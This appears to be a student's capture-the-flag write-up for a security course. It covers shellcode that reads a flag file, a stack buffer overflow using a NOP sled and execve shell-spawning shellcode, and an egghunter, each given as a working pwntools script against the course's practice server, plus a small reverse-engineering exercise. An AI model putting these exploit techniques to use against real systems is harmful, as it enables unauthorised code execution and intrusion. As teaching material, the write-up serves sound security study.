simple
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaW1wbGUiLCJpcCI6IjEyMy4yNDMuNi4xMzYiLCJzZXNzaW9uIjoiYTVhNTc1M2YtYjBjNS00MDNjLTk4N2UtNTliZDhiZTU2YzVkIn0.GgcrHSdNdD1gJyeZdWIQwOWagA3h6d1VsLBxFb-CuUA}

General overview of problems faced
-------------------------------------
When running the binary, it states that it is basically the same as the lab exercise, except I can only call the syscalls read and write. This means that the program simply asks for shellcode as input, and then will execute it.

It then says a file containing the flag is opened with fd 1000. Hence, I am going to want to run shellcode which reads from fd 1000, and the prints the result to stdout.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 3001)

# This shellcode is split into a call to sys_read and a call to sys_write.

# For sys_read, we first subtract 500 from the value stored in the stack pointer,
# which creates a buffer of 500 bytes to write into at the top of the stack.

# Then, we want to move the arguments for this function into the appropriate registers.
# Using the syscall reference table, we move the fd 1000 into ebx, the address of
# the buffer into ecx, and the number of bytes to read into edx. Finally, we move
# the value for sys_read into eax and call it using int 0x80.

# For sys_write, we simply need to move the arguments into the registers. Hence, we
# move the fd 1 (for stdout) into ebx, the address of the buffer into ecx, and the
# number of bytes to read into edx. We load this value from eax because sys_read
# returns the number of bytes read into eax, so we only want to write that many bytes.
# Finally we move the value for sys_write into eax and call it using int 0x80.
shellcode = asm("""
sub esp, 500
mov ebx, 1000
lea ecx, [esp]
mov edx, 500
mov eax, 0x03
int 0x80

mov ebx, 1
lea ecx, [esp]
mov edx, eax
mov eax, 0x04
int 0x80
""")

p.sendline(shellcode)

p.interactive()
```

shellz
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaGVsbHoiLCJpcCI6IjEyMy4yNDMuNi4xMzYiLCJzZXNzaW9uIjoiN2Y5YzhjNGQtYzc2YS00MDdmLWFjMDUtYjBiYzAwOTE5NzgyIn0.-jVyrwhcO-pt2jhTASPpEDDvvKHCDu-XyWRN2j4chjQ}

General overview of problems faced
-------------------------------------
When running this binary, it states that there isn't a win function, yet the stack is executable. This makes me believe I am going to want to execute shellcode that pops a shell. It also gives a random stack address, which I believe I am going to want to extract and then jump to.

After displaying this info, it then gives me a buffer in which I can write into. To determine the offset from the start of this buffer to the return address, I used the command 'python3 -c "print('a' * 8200)" | challenges/./shellz' to run the binary with different amounts of input. From trial and error, I was able to determine that passing in 8200 bytes caused an overflow, yet anything less did not.

Hence, my plan is to overflow the buffer with 8200 bytes until I reach the EIP register which contains the return address, at which point I can point it to the random stack address. Now whilst it would be ideal to place my shellcode at this address exactly, this is too difficult. 

What I can do however, is place a NOP sled in my overflow so that if this random address happens to be overwritten by a NOP instruction, it will keep executing them until it reaches the shellcode which I place after the NOP sled.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 3002)

# First we extract the 'random stack address' which we want to return to
p.recvuntil("random stack address: ")
randomStack = int(p.recvline()[:-1], 0)

# Here is the shellcode to pop a shell. It first sets eax to 0 and pushes it to the
# stack, and then pushes the string "/bin//sh". After this, we move the arguments
# into their registers, and then move the value for execve into the lower 8 bits
# of eax, and then call it using int 0x80.
shellcode = asm("""
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, SYS_execve
int 0x80
""")

# Here we send our payload for the buffer overflow. We use the filler parameter to
# input our NOP sled. Since our return address is at an offest of 8200 bytes, this is
# the offset that we place the stack address we want to jump to.

# We also want to include our shellcode in this payload. As for the offset to place
# it, we want it as late in the payload as possible to maximise the chance we land
# on the NOP sled preceding it. Hence, we determine it is 23 bytes long using
# log.info(len(shellcode)), and then add an extra 8 bytes of buffer between the
# shellcode and return address, giving us 8200 - 8 - 23 = 8169.
p.sendline(flat({
  8169: shellcode,
  8200: p32(randomStack)
  }, filler=b"\x90"))

# Now we should have shell access, and can use 'cat flag' to view the flag
p.interactive()
```

find-me
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1maW5kLW1lIiwiaXAiOiIyMjAuMjQwLjgyLjk2Iiwic2Vzc2lvbiI6IjQyMzgyMTU3LWQ4NWItNGY4Yy05MjRhLTZlNTFlYzk4NTM0YyJ9.VnLOfG2nW77YrljjeHoVVlvrgI7nzK4NI05tC0xOF2c}

General overview of problems faced
-------------------------------------
When running this binary, it states that I am given two buffers on the stack, one large and one small. It also says it will execute whatever I place in the first buffer, yet not the second. Finally it says all syscalls are disabled except read and write, and the flag is in a file with fd 1000.

Since this is similar to the simple challenge, I am going to want to run the same shellcode I created there to read and write the contents of the flag file.

However, this shellcode is too large to fit on the small buffer which gets executed. Since we have a small buffer as well as a larger buffer we can write into somewhere else on the stack, this follows the pattern of an egghunter.

In the small buffer, we place egghunter shellcode which iterates through memory looking for an egg. In the large buffer, we place this egg value followed by our larger shellcode that gets the flag. Hence, when my egghunter shellcode finds the egg value in memory, it will then execute my shellcode placed directly after it.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 3003)

# Here we create the egg value 0xfcfcfcfc, as this is unlikely to appear naturally
# in memory.
egg = p32(0xfcfcfcfc)

# Next, we create the shellcode for the egghunter. First it moves our egg value
# into the edx register. It then enters a loop where it increments the eax register
# by 1, compares the value at this address with our egg, and if not equal jumps back
# to the top of the loop. If it was equal, then we want to jump to start executing
# our shellcode placed after the egg.
egghunter = asm("""
mov edx, 0xfcfcfcfc
loop:
  inc eax
  cmp DWORD PTR [eax], edx
  jne loop
  jmp eax
""")

# This is the shellcode to read and write the contents of the flag file. Since it is
# setup the same as the simple challenge, we have simply used the same assembly here.
shellcode = asm("""
sub esp, 500
mov ebx, 1000
lea ecx, [esp]
mov edx, 500
mov eax, 0x03
int 0x80

mov ebx, 1
lea ecx, [esp]
mov edx, eax
mov eax, 0x04
int 0x80
""")

# We first input the egghunter shellcode into the small buffer.
p.sendline(egghunter)

# And we send the egg followed by our read and write shellcode into the large buffer.
p.sendline(egg+shellcode)

p.interactive()
```

re challenge (chall2)
=============
General overview of problems faced
-------------------------------------
To reverse engineer the assembly, I first looked for any familiar patterns. I immediately noticed
that there was a loop in this function. This is because the value 0 is loaded into a register, and then compared to 0x9. If it is less than or equal to 9, then it enters the green branch, otherwise it enters the red branch and returns from the function. Hence, this is the while condition for the loop.

We can also see at the bottom of the assembly an instruction to add 1 to our loop counter, and then after this it enters the comparison with 9 again. Hence, I was able to add the 'i++' at the end of the loop.

Once entering the loop, we see that the loop counter is loaded into the eax register before the 'and' instruction is performed on itself and 1. If the result is 0, we skip the next part of code. I was able to determine that this was simply performing a logical '&' on our counter and 1, and then checking if it was equal to 0.

Finally, if this if condition is true, we can see that some values are pushed to the stack and then printf is called. One of these values is our loop counter, and the other is from the data section, so I assumed this is the string formatter "%d\n".

Once putting this code together, I simply had to define the main function, as well as include the stdio library, and this function was complete.

```C
#include <stdio.h>

int main(int argc, char** argv) {

  int i = 0;
  while (i <= 9) {
    if (i & 1 != 0) {
      printf("%d\n", i);
    }
    i++;
  }

  return 1;
}
```
